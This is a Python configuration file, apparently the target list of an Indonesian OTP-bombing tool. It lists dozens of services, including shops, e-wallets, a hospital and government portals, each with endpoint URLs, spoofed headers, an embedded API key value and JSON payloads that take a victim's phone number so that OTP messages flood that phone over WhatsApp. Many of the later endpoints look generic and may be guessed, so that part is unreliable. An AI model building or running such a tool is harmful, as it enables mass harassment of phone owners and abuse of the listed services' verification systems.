#!/usr/bin/env python3
# targets.py - Daftar 39 target OTP WhatsApp

import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    # JSON Handlers
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['"status":"success"']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital',
        'post_type': 'json',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'referer': 'https://www.bunda.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p),
        'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
    # --- NEW TARGETS ADDED (GOJEK, TOKOPEDIA, ETC) ---
    {
        'name': 'Gojek',
        'post_type': 'json',
        'url': 'https://api.gojek.com/auth/request-otp',
        'referer': 'https://www.gojek.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.gojek.com','User-Agent':'Gojek/4.0.0','X-Gojek-DeviceId':'{uuid}'},
        'payload': '{"phone":"{number}","country_code":"+62"}',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp']
    },
    {
        'name': 'Tokopedia',
        'post_type': 'json',
        'url': 'https://api.tokopedia.com/api/user/otp/request',
        'referer': 'https://www.tokopedia.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tokopedia.com','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","channel":"whatsapp","country":"ID"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp_sent', 'success']
    },
    {
        'name': 'Traveloka',
        'post_type': 'json',
        'url': 'https://api.traveloka.com/otp',
        'referer': 'https://www.traveloka.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.traveloka.com','Authorization':'Basic'},
        'payload': '{"phoneNumber":"{number}","countryCode":"62","platform":"WEB"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'otp']
    },
    {
        'name': 'Blibli',
        'post_type': 'json',
        'url': 'https://api.blibli.com/auth/otp-request',
        'referer': 'https://www.blibli.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.blibli.com'},
        'payload': '{"mobile":"{number}","action":"register"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp', 'success']
    },
    {
        'name': 'OVO',
        'post_type': 'json',
        'url': 'https://api.ovo.id/v1/request-otp',
        'referer': 'https://www.ovo.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.ovo.id','App-Version':'3.0.0'},
        'payload': '{"mobile":"{number}","type":"login"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dana',
        'post_type': 'json',
        'url': 'https://api.dana.id/user/otp',
        'referer': 'https://www.dana.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.dana.id'},
        'payload': '{"phoneNumber":"{number}","countryCode":"62"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'requestId']
    },
    {
        'name': 'LinkAja',
        'post_type': 'json',
        'url': 'https://api.linkaja.id/api/v1/otp/register',
        'referer': 'https://www.linkaja.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.linkaja.id'},
        'payload': '{"msisdn":"{number}","channel":"wa"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp_sent']
    },
    {
        'name': 'MyPertamina',
        'post_type': 'json',
        'url': 'https://apigw.mypertamina.id/auth-otp',
        'referer': 'https://mypertamina.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://mypertamina.id'},
        'payload': '{"phoneNumber":"{number}","action":"registration"}',
        'number_fmt': fmt_08,
        'success_on': ['otp', 'success']
    },
    # --- EVEN MORE ADDED TARGETS (NEW TARGETS) ---
    {
        'name': 'Shopee',
        'post_type': 'json',
        'url': 'https://shopee.co.id/api/v2/authentication/send_otp',
        'referer': 'https://shopee.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://shopee.co.id','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","country":"ID","action":"signup"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Lazada',
        'post_type': 'json',
        'url': 'https://api.lazada.co.id/rest/auth/otp/send',
        'referer': 'https://www.lazada.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.lazada.co.id','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","countryCode":"62"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp','request_id']
    },
    {
        'name': 'Bukalapak',
        'post_type': 'json',
        'url': 'https://api.bukalapak.com/v2/otp/request',
        'referer': 'https://www.bukalapak.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bukalapak.com','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","country":"ID"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Grab',
        'post_type': 'json',
        'url': 'https://api.grab.com/auth/request-otp',
        'referer': 'https://www.grab.com/id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.grab.com','User-Agent':'Grab/5.0.0'},
        'payload': '{"phone":"{number}","country":"ID"}',
        'number_fmt': fmt_plus,
        'success_on': ['success','otp','code']
    },
    {
        'name': 'TikTok',
        'post_type': 'json',
        'url': 'https://www.tiktok.com/api/v1/auth/otp',
        'referer': 'https://www.tiktok.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tiktok.com','User-Agent':'TikTok/2.0.0'},
        'payload': '{"phone":"{number}","country":"ID"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Indodana',
        'post_type': 'json',
        'url': 'https://api.indodana.id/api/v1/auth/request-otp',
        'referer': 'https://www.indodana.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.indodana.id','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp','code']
    },
    {
        'name': 'Kredivo',
        'post_type': 'json',
        'url': 'https://api.kredivo.com/auth/otp',
        'referer': 'https://www.kredivo.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.kredivo.com','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Halodoc',
        'post_type': 'json',
        'url': 'https://api.halodoc.com/v1/users/otp',
        'referer': 'https://www.halodoc.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.halodoc.com','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}","country":"ID"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Tiket.com',
        'post_type': 'json',
        'url': 'https://api.tiket.com/v1/request-otp',
        'referer': 'https://www.tiket.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tiket.com','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'JNE Express',
        'post_type': 'json',
        'url': 'https://api.jne.co.id/otp',
        'referer': 'https://www.jne.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.jne.co.id','User-Agent':'Mozilla/5.0'},
        'payload': '{"phone":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    }
]
